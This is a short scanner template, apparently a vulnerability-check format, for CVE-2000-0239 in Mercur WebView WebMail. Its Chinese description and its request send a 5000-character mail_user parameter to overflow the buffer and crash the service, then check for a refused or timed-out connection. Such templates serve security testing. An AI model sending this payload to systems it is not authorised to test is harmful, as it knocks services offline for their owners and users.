[info]
author = "ave"
description = "向 WebView WebMail 服务器发送包含超长 mail_user 参数的 GET 请求，触发缓冲区溢出导致服务崩溃。验证方式：发送溢出 payload 后检测服务是否无响应。"
id = "POC-AVE-2000-0217"
name = "Atrium Software Mercur WebView WebMail 缓冲区溢出 PoC"
severity = "medium"
tags = ["ave-2000-0217"]
vuln_id = [
    "CVE-2000-0239",
    "AVE-2000-0217",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/mmain.html&mail_user={{repeat('A', 5000)}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "refused",
    "reset",
    "timeout",
    "closed",
]
